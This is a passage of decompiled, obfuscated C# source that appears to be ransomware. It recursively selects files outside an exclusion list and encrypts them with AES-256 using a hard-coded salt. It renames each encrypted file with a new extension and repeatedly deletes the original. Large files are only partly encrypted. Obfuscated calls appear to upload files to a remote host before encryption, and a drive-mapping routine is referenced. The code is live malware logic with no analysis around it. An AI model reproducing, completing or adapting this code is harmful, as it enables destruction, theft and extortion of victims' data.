!CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(dOYydSKoLzIp.getString_0(107400527)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(dOYydSKoLzIp.getString_0(107400542)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(dOYydSKoLzIp.getString_0(107400497)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(dOYydSKoLzIp.getString_0(107400508)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(dOYydSKoLzIp.getString_0(107400463)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(dOYydSKoLzIp.getString_0(107400482)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(dOYydSKoLzIp.getString_0(107400433)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().Contains(dOYydSKoLzIp.getString_0(107400448)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(jGDSNxQzvqSx(dOYydSKoLzIp.getString_0(107400399))) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(dOYydSKoLzIp.getString_0(107400374)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(dOYydSKoLzIp.getString_0(107397161)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(dOYydSKoLzIp.getString_0(107400361)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.EndsWith(CS_0024_003C_003E8__locals0.EonUYJCKfDwF) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.EndsWith(dOYydSKoLzIp.getString_0(107400336)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.EndsWith(dOYydSKoLzIp.getString_0(107400331)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.EndsWith(dOYydSKoLzIp.getString_0(107400358)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.EndsWith(dOYydSKoLzIp.getString_0(107400353)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(dOYydSKoLzIp.getString_0(107400348)) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(COjZSLMnxffln) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(ndioqUCcjeEwRygxn) && !CS_0024_003C_003E8__locals0.hGfHXtUEXE.Contains(zSigBrcrKLvB))
			{
				if (CS_0024_003C_003E8__locals0.qEiHtzqbfmL.Length != 0)
				{
					string[] qEiHtzqbfmL = CS_0024_003C_003E8__locals0.qEiHtzqbfmL;
					int num = 0;
					while (num < qEiHtzqbfmL.Length)
					{
						string value = qEiHtzqbfmL[num];
						if (!CS_0024_003C_003E8__locals0.hGfHXtUEXE.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_1069;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.hGfHXtUEXE.EndsWith(CS_0024_003C_003E8__locals0.EonUYJCKfDwF))
					{
						goto IL_1069;
					}
				}
				catch (Exception)
				{
					goto IL_1069;
				}
				if (!fQuiHGzOTAlx.Contains(CS_0024_003C_003E8__locals0.hGfHXtUEXE))
				{
					if (FiFLjMAxemfbt == dOYydSKoLzIp.getString_0(107396796))
					{
						try
						{
							if (ZLSBErccDQjOJ.DcKeziOuuW(CS_0024_003C_003E8__locals0.hGfHXtUEXE))
							{
								ZLSBErccDQjOJ.LJaTPEFDEMKOys(CS_0024_003C_003E8__locals0.hGfHXtUEXE);
							}
						}
						catch
						{
						}
					}
					fQuiHGzOTAlx.Add(CS_0024_003C_003E8__locals0.hGfHXtUEXE);
					if (!kEshrQncftX.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.hGfHXtUEXE)))
					{
						kEshrQncftX.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.hGfHXtUEXE));
					}
					uExGuCdAfUHFL(CS_0024_003C_003E8__locals0.hGfHXtUEXE);
					try
					{
						new efPnRHzmkfdXQE().lNahgQsJZubULu(CS_0024_003C_003E8__locals0.hGfHXtUEXE);
					}
					catch
					{
					}
					try
					{
						using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.hGfHXtUEXE, FileMode.Open, FileAccess.Write);
						if (!fileStream.CanWrite)
						{
							try
							{
								if (RxwgNpmsCUXw)
								{
									Console.WriteLine(dOYydSKoLzIp.getString_0(107349388) + CS_0024_003C_003E8__locals0.hGfHXtUEXE + dOYydSKoLzIp.getString_0(107348863) + new FileInfo(CS_0024_003C_003E8__locals0.hGfHXtUEXE).Length + dOYydSKoLzIp.getString_0(107348810));
									Console.WriteLine(dOYydSKoLzIp.getString_0(107348833));
								}
							}
							catch
							{
							}
							wCRzvBOPsnK(jGDSNxQzvqSx(dOYydSKoLzIp.getString_0(107348728)), dOYydSKoLzIp.getString_0(107400744) + CS_0024_003C_003E8__locals0.hGfHXtUEXE + dOYydSKoLzIp.getString_0(107400744) + jGDSNxQzvqSx(dOYydSKoLzIp.getString_0(107348703)) + dOYydSKoLzIp.getString_0(107400744) + Environment.UserName + dOYydSKoLzIp.getString_0(107400744) + jGDSNxQzvqSx(dOYydSKoLzIp.getString_0(107348654)));
						}
					}
					catch (Exception ex2)
					{
						if (SBPYnaSzKyFP)
						{
							try
							{
								File.AppendAllText(ndioqUCcjeEwRygxn, dOYydSKoLzIp.getString_0(107397969) + CS_0024_003C_003E8__locals0.hGfHXtUEXE + dOYydSKoLzIp.getString_0(107348629) + ex2.Message + dOYydSKoLzIp.getString_0(107396563));
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
						return;
					}
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.hGfHXtUEXE).Length != 0L)
							{
								goto end_IL_085c;
							}
							goto end_IL_085c_2;
							end_IL_085c:;
						}
						catch (Exception ex4)
						{
							if (SBPYnaSzKyFP)
							{
								try
								{
									File.AppendAllText(ndioqUCcjeEwRygxn, dOYydSKoLzIp.getString_0(107397969) + CS_0024_003C_003E8__locals0.hGfHXtUEXE + dOYydSKoLzIp.getString_0(107349092) + ex4.Message + dOYydSKoLzIp.getString_0(107396563));
								}
								catch (Exception)
								{
								}
							}
							PuPUesizAwkkz++;
							goto end_IL_085c_2;
						}
						if (eUAtnXtzwCVQtt == dOYydSKoLzIp.getString_0(107396796) && new FileInfo(CS_0024_003C_003E8__locals0.hGfHXtUEXE).Length > Convert.ToInt32(XLyVBayizjzN) * 1024 * 1024)
						{
							try
							{
								if (CS_0024_003C_003E8__locals0.EonUYJCKfDwF != dOYydSKoLzIp.getString_0(107398221))
								{
									if (lHJbFcHZdNnC)
									{
										CS_0024_003C_003E8__locals0.EonUYJCKfDwF = GrEoYlDdrrJcnWE + CS_0024_003C_003E8__locals0.EonUYJCKfDwF;
									}
									File.Move(CS_0024_003C_003E8__locals0.hGfHXtUEXE, CS_0024_003C_003E8__locals0.hGfHXtUEXE + CS_0024_003C_003E8__locals0.EonUYJCKfDwF);
								}
							}
							catch (Exception ex6)
							{
								if (SBPYnaSzKyFP)
								{
									try
									{
										File.AppendAllText(ndioqUCcjeEwRygxn, dOYydSKoLzIp.getString_0(107397969) + CS_0024_003C_003E8__locals0.hGfHXtUEXE + dOYydSKoLzIp.getString_0(107349031) + ex6.Message + dOYydSKoLzIp.getString_0(107396563));
									}
									catch (Exception)
									{
									}
								}
								PuPUesizAwkkz++;
								return;
							}
							if (CS_0024_003C_003E8__locals0.EonUYJCKfDwF != dOYydSKoLzIp.getString_0(107398221))
							{
								CS_0024_003C_003E8__locals0.hGfHXtUEXE += CS_0024_003C_003E8__locals0.EonUYJCKfDwF;
							}
							if (cGbDMszYvGe == dOYydSKoLzIp.getString_0(107396796))
							{
								Thread thread = new Thread((ThreadStart)delegate
								{
									foreach (string item3 in UaltDtqfmMVTAX)
									{
										if (CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.EqCJrbOGYCEo.EonUYJCKfDwF) && cGDFQVDbXvzo == dOYydSKoLzIp.lMWNgthKPX.getString_0(107396802))
										{
											if (Convert.ToInt32(dJYbFJwmiw) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.hGfHXtUEXE).Length)
											{
												try
												{
													mzYnDQcPQMD.ubBkhifeJCfa(dOYydSKoLzIp.lMWNgthKPX.getString_0(107401555), dOYydSKoLzIp.lMWNgthKPX.getString_0(107401550), dOYydSKoLzIp.lMWNgthKPX.getString_0(107401569), CS_0024_003C_003E8__locals0.hGfHXtUEXE);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.hGfHXtUEXE.ToLower().EndsWith(item3) && cGDFQVDbXvzo == dOYydSKoLzIp.lMWNgthKPX.getString_0(107397059))
										{
											try
											{
												mzYnDQcPQMD.ubBkhifeJCfa(dOYydSKoLzIp.lMWNgthKPX.getString_0(107401555), dOYydSKoLzIp.lMWNgthKPX.getString_0(107401550), dOYydSKoLzIp.lMWNgthKPX.getString_0(107401569), CS_0024_003C_003E8__locals0.hGfHXtUEXE);
											}
											catch
											{
											}
										}
									}
								});
								thread.IsBackground = false;
								thread.Priority = ThreadPriority.Normal;
								thread.Start();
							}
							string text = fDzYxdGrlFct.LiytReEiZfhPA(32);
							string text2 = dOYydSKoLzIp.getString_0(107401500);
							text2 = (IflXfWBKZN ? fDzYxdGrlFct.rrVuhdVHDJo() : dOYydSKoLzIp.getString_0(107401500));
							string s = EURLmwFlibc.RjcOjZuEiYhKh(text + text2);
							byte[] bytes = Encoding.ASCII.GetBytes(s);
							if (PurCmZibxBamv == dOYydSKoLzIp.getString_0(107397053))
							{
								byte[] array = null;
								byte[] byte_ = TplgMgKkTztrkdI.GDREwDOvqQ(CS_0024_003C_003E8__locals0.hGfHXtUEXE, Convert.ToInt32(XLyVBayizjzN) * 1024 * 1024);
								if (!TplgMgKkTztrkdI.txaKUWpwgCrrkU(NviomBsLdCW: (!FmiPpRhQSBxQ) ? (IflXfWBKZN ? TplgMgKkTztrkdI.vtWmNLyRqcLW(byte_, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : TplgMgKkTztrkdI.vtWmNLyRqcLW(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.QsejQwxWKSqe), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (IflXfWBKZN ? nqDlrZSqItsRF.PWhWBEuyfRKWPX(byte_, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : nqDlrZSqItsRF.PWhWBEuyfRKWPX(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.QsejQwxWKSqe), Convert.FromBase64String(eUUqvSerqkEdI))), lswqspBeUzjGi: CS_0024_003C_003E8__locals0.hGfHXtUEXE, AftuALoSYuJQ: bytes))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.hGfHXtUEXE + CS_0024_003C_003E8__locals0.EonUYJCKfDwF, CS_0024_003C_003E8__locals0.hGfHXtUEXE);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!IflXfWBKZN)
							{
								if (!ubLoTFodkJ.ExViKdySZgBq(CS_0024_003C_003E8__locals0.hGfHXtUEXE, XLyVBayizjzN, CS_0024_003C_003E8__locals0.QsejQwxWKSqe, null, Convert.FromBase64String(eUUqvSerqkEdI)))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.hGfHXtUEXE + CS_0024_003C_003E8__locals0.EonUYJCKfDwF, CS_0024_003C_003E8__locals0.hGfHXtUEXE);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!ubLoTFodkJ.ExViKdySZgBq(CS_0024_003C_003E8__locals0.hGfHXtUEXE, XLyVBayizjzN, text, bytes, Convert.FromBase64String(text2)))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.hGfHXtUEXE + CS_0024_003C_003E8__locals0.EonUYJCKfDwF, CS_0024_003C_003E8__locals0.hGfHXtUEXE);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else
						{
							if (lHJbFcHZdNnC)
							{
								CS_0024_003C_003E8__locals0.EonUYJCKfDwF = GrEoYlDdrrJcnWE + CS_0024_003C_003E8__locals0.EonUYJCKfDwF;
							}
							string text3 = fDzYxdGrlFct.LiytReEiZfhPA(32);
							string text4 = dOYydSKoLzIp.getString_0(107401500);
							text4 = (IflXfWBKZN ? fDzYxdGrlFct.rrVuhdVHDJo() : dOYydSKoLzIp.getString_0(107401500));
							string s2 = EURLmwFlibc.RjcOjZuEiYhKh(text3 + text4);
							byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
							if (CS_0024_003C_003E8__locals0.EonUYJCKfDwF != dOYydSKoLzIp.getString_0(107398221))
							{
								if (!yNTMpjtZXpajKX)
								{
									if (!IflXfWBKZN)
									{
										iZHZdbWaVjfuoZyn(CS_0024_003C_003E8__locals0.hGfHXtUEXE, CS_0024_003C_003E8__locals0.hGfHXtUEXE + CS_0024_003C_003E8__locals0.EonUYJCKfDwF, dZNuvPCEnaSnNI);
									}
									else
									{
										iZHZdbWaVjfuoZyn(CS_0024_003C_003E8__locals0.hGfHXtUEXE, CS_0024_003C_003E8__locals0.hGfHXtUEXE + CS_0024_003C_003E8__locals0.EonUYJCKfDwF, Convert.FromBase64String(text3));
									}
								}
								else
								{
									try
									{
										if (!IflXfWBKZN)
										{
											cpHiazSZzHHd(CS_0024_003C_003E8__locals0.hGfHXtUEXE, CS_0024_003C_003E8__locals0.hGfHXtUEXE + CS_0024_003C_003E8__locals0.EonUYJCKfDwF, dZNuvPCEnaSnNI, Convert.FromBase64String(eUUqvSerqkEdI));
										}
										else
										{
											cpHiazSZzHHd(CS_0024_003C_003E8__locals0.hGfHXtUEXE, CS_0024_003C_003E8__locals0.hGfHXtUEXE + CS_0024_003C_003E8__locals0.EonUYJCKfDwF, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
										}
									}
									catch (Exception ex11)
									{
										if (SBPYnaSzKyFP)
										{
											try
											{
												File.AppendAllText(ndioqUCcjeEwRygxn, dOYydSKoLzIp.getString_0(107397969) + CS_0024_003C_003E8__locals0.hGfHXtUEXE + dOYydSKoLzIp.getString_0(107398239) + ex11.Message + dOYydSKoLzIp.getString_0(107396563));
											}
											catch (Exception)
											{
											}
										}
										PuPUesizAwkkz++;
										try
										{
											File.Move(CS_0024_003C_003E8__locals0.hGfHXtUEXE + CS_0024_003C_003E8__locals0.EonUYJCKfDwF, CS_0024_003C_003E8__locals0.hGfHXtUEXE);
											return;
										}
										catch (Exception)
										{
											return;
										}
									}
								}
							}
							else if (!yNTMpjtZXpajKX)
							{
								if (!IflXfWBKZN)
								{
									iZHZdbWaVjfuoZyn(CS_0024_003C_003E8__locals0.hGfHXtUEXE, CS_0024_003C_003E8__locals0.hGfHXtUEXE + dOYydSKoLzIp.getString_0(107398216), dZNuvPCEnaSnNI);
								}
								else
								{
									iZHZdbWaVjfuoZyn(CS_0024_003C_003E8__locals0.hGfHXtUEXE, CS_0024_003C_003E8__locals0.hGfHXtUEXE + dOYydSKoLzIp.getString_0(107398216), Convert.FromBase64String(text3));
								}
							}
							else
							{
								try
								{
									if (!IflXfWBKZN)
									{
										cpHiazSZzHHd(CS_0024_003C_003E8__locals0.hGfHXtUEXE, CS_0024_003C_003E8__locals0.hGfHXtUEXE, dZNuvPCEnaSnNI, Convert.FromBase64String(eUUqvSerqkEdI));
									}
									else
									{
										cpHiazSZzHHd(CS_0024_003C_003E8__locals0.hGfHXtUEXE, CS_0024_003C_003E8__locals0.hGfHXtUEXE, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
									}
								}
								catch (Exception ex14)
								{
									if (SBPYnaSzKyFP)
									{
										try
										{
											File.AppendAllText(ndioqUCcjeEwRygxn, dOYydSKoLzIp.getString_0(107397969) + CS_0024_003C_003E8__locals0.hGfHXtUEXE + dOYydSKoLzIp.getString_0(107398239) + ex14.Message + dOYydSKoLzIp.getString_0(107396563));
										}
										catch (Exception)
										{
										}
									}
									PuPUesizAwkkz++;
									return;
								}
							}
							if (IflXfWBKZN)
							{
								if (CS_0024_003C_003E8__locals0.EonUYJCKfDwF != dOYydSKoLzIp.getString_0(107398221))
								{
									vtJKNupXtRpM(CS_0024_003C_003E8__locals0.hGfHXtUEXE + CS_0024_003C_003E8__locals0.EonUYJCKfDwF, bytes2);
								}
								else
								{
									vtJKNupXtRpM(CS_0024_003C_003E8__locals0.hGfHXtUEXE, bytes2);
								}
							}
						}
						end_IL_085c_2:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_1069;
			IL_1069:
			CS_0024_003C_003E8__locals0.mBwKTyYUMnTK.Remove(CS_0024_003C_003E8__locals0.hGfHXtUEXE);
		});
	}

	private static void snSxNpiYyfzFU(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (cGbDMszYvGe == getString_0(107396776))
					{
						foreach (string item in UaltDtqfmMVTAX)
						{
							if (string_0.ToLower().EndsWith(item) && cGDFQVDbXvzo == getString_0(107396776))
							{
								if (Convert.ToInt32(dJYbFJwmiw) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										mzYnDQcPQMD.ubBkhifeJCfa(getString_0(107401529), getString_0(107401524), getString_0(107401543), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && cGDFQVDbXvzo == getString_0(107397033))
							{
								try
								{
									mzYnDQcPQMD.ubBkhifeJCfa(getString_0(107401529), getString_0(107401524), getString_0(107401543), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107398196)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107398196), getString_0(107401480)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void cpHiazSZzHHd(string IVQbfthWBaXBpB, string TCBZZpZFoubv, byte[] ZlNwBqMMTU, byte[] wawJvdHbCSSHU = null)
	{
		try
		{
			if (cGbDMszYvGe == getString_0(107396776))
			{
				FileStream fileStream = new FileStream(IVQbfthWBaXBpB, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string item in UaltDtqfmMVTAX)
				{
					if (IVQbfthWBaXBpB.ToLower().EndsWith(item) && cGDFQVDbXvzo == getString_0(107396776))
					{
						if (Convert.ToInt32(dJYbFJwmiw) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								mzYnDQcPQMD.ubBkhifeJCfa(getString_0(107401529), getString_0(107401524), getString_0(107401543), IVQbfthWBaXBpB);
							}
							catch
							{
							}
						}
					}
					else if (IVQbfthWBaXBpB.ToLower().EndsWith(item) && cGDFQVDbXvzo == getString_0(107397033))
					{
						try
						{
							mzYnDQcPQMD.ubBkhifeJCfa(getString_0(107401529), getString_0(107401524), getString_0(107401543), IVQbfthWBaXBpB);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (IVQbfthWBaXBpB != TCBZZpZFoubv)
		{
			File.Move(IVQbfthWBaXBpB, TCBZZpZFoubv);
			IVQbfthWBaXBpB = TCBZZpZFoubv;
		}
		byte[] bytes = nqDlrZSqItsRF.PWhWBEuyfRKWPX(File.ReadAllBytes(IVQbfthWBaXBpB), ZlNwBqMMTU, wawJvdHbCSSHU);
		File.WriteAllBytes(IVQbfthWBaXBpB, bytes);
		SYFhGDZRgJn++;
	}

	private static void iZHZdbWaVjfuoZyn(string string_0, string string_1, byte[] byte_0)
	{
		yXTzQNUHviShmVK CS_0024_003C_003E8__locals0 = new yXTzQNUHviShmVK();
		CS_0024_003C_003E8__locals0.IydBnzUZeTLaoWq = string_0;
		CS_0024_003C_003E8__locals0.gKzpVcIViue = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string gKzpVcIViue = CS_0024_003C_003E8__locals0.gKzpVcIViue;
			FileStream fileStream = new FileStream(gKzpVcIViue, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (KZdUWCMWRza == getString_0(107396776))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.IydBnzUZeTLaoWq, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.IydBnzUZeTLaoWq, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.IydBnzUZeTLaoWq, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.gKzpVcIViue.Length > 0)
				{
					if (cGbDMszYvGe == getString_0(107396776))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.IydBnzUZeTLaoWq, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in UaltDtqfmMVTAX)
						{
							if (CS_0024_003C_003E8__locals0.IydBnzUZeTLaoWq.ToLower().EndsWith(item) && cGDFQVDbXvzo == getString_0(107396776))
							{
								if (Convert.ToInt32(dJYbFJwmiw) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										mzYnDQcPQMD.ubBkhifeJCfa(getString_0(107401529), getString_0(107401524), getString_0(107401543), CS_0024_003C_003E8__locals0.IydBnzUZeTLaoWq);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.IydBnzUZeTLaoWq.ToLower().EndsWith(item) && cGDFQVDbXvzo == getString_0(107397033))
							{
								try
								{
									mzYnDQcPQMD.ubBkhifeJCfa(getString_0(107401529), getString_0(107401524), getString_0(107401543), CS_0024_003C_003E8__locals0.IydBnzUZeTLaoWq);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.IydBnzUZeTLaoWq);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.gKzpVcIViue.EndsWith(getString_0(107398196)))
					{
						File.Move(CS_0024_003C_003E8__locals0.gKzpVcIViue, CS_0024_003C_003E8__locals0.gKzpVcIViue.Replace(getString_0(107398196), getString_0(107401480)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.gKzpVcIViue))
							{
								File.Delete(CS_0024_003C_003E8__locals0.gKzpVcIViue);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (SBPYnaSzKyFP)
			{
				try
				{
					File.AppendAllText(ndioqUCcjeEwRygxn, getString_0(107397949) + CS_0024_003C_003E8__locals0.IydBnzUZeTLaoWq + getString_0(107398219) + ex2.Message + getString_0(107396543));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__6()
	{
		List<string> source = rPkvGTbuGbKlHk;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
			{
				wCRzvBOPsnK(jGDSNxQzvqSx(getString_0(107398134)), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
		List<string> yxlLJRTpOOTgKkLzz = YxlLJRTpOOTgKkLzz;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
			{
				wCRzvBOPsnK(jGDSNxQzvqSx(getString_0(107398153)), string_0);
			};
		}
		Parallel.ForEach(yxlLJRTpOOTgKkLzz, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
		if (aprXJMnTJqstf == getString_0(107396776))
		{
			string[] goQslNJCCQhWEu = GoQslNJCCQhWEu;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
				{
					wCRzvBOPsnK(jGDSNxQzvqSx(getString_0(107398153)), getString_0(107398128) + string_0 + getString_0(107398119));
				};
			}
			Parallel.ForEach(goQslNJCCQhWEu, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		}
		if (!yoVntBnyjeiaCWdn().Contains(getString_0(107397815)))
		{
			MrGKXccdJYxE(bgwisiXwlPmoFco);
		}
		else
		{
			List<string> source2 = sneXTQQmOIFmFM;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
				{
					wCRzvBOPsnK(jGDSNxQzvqSx(WtpiMWAvqdSBV(getString_0(107398082))), string_0);
				};
			}
			Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
		}
		List<string> source3 = fSptdVtByMByFE;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
			{
				wCRzvBOPsnK(jGDSNxQzvqSx(getString_0(107398089)), string_0);
			};
		}
		Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		wCRzvBOPsnK(jGDSNxQzvqSx(getString_0(107398134)), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		wCRzvBOPsnK(jGDSNxQzvqSx(getString_0(107398153)), string_0);
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		wCRzvBOPsnK(jGDSNxQzvqSx(getString_0(107398153)), getString_0(107398128) + string_0 + getString_0(107398119));
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		wCRzvBOPsnK(jGDSNxQzvqSx(WtpiMWAvqdSBV(getString_0(107398082))), string_0);
	}

	private static void _003CMain_003Eb__b(string string_0)
	{
		wCRzvBOPsnK(jGDSNxQzvqSx(getString_0(107398089)), string_0);
	}

	private static void _003CMapDrv_003Eb__18(string string_0)
	{
		CvtvsehZvVox CS_0024_003C_003E8__locals0 = new CvtvsehZvVox();
		CS_0024_003C_003E8__locals0.OfutQEOgrcWV = string_0;
